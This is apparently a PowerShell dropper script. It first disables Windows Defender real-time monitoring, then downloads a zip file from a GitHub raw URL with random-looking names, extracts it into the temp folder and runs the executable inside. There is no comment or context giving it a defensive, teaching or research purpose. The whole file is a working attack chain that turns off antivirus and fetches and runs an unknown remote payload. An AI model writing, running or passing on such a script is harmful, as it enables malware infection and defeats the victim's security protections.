Set-MpPreference -DisableRealtimeMonitoring $true

$url = "https://github.com/WarrenBruhfet/random/raw/refs/heads/main/hgdhsg.zip"  # URL of the zip file
$zipPath = "$env:TEMP\gsfgsgfdg.zip"  # Save location for zip
$extractPath = "$env:TEMP\extracted\"  # Folder to extract to
$exePath = "$extractPath\hgdhsg.exe" # Path to the actual executable inside the zip

# Download the ZIP file
Invoke-WebRequest -Uri $url -OutFile $zipPath

# Create extraction directory if it doesn't exist
New-Item -ItemType Directory -Path $extractPath -Force

# Extract the ZIP file
Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

# Execute the extracted .exe
Start-Process -FilePath $exePath -Wait
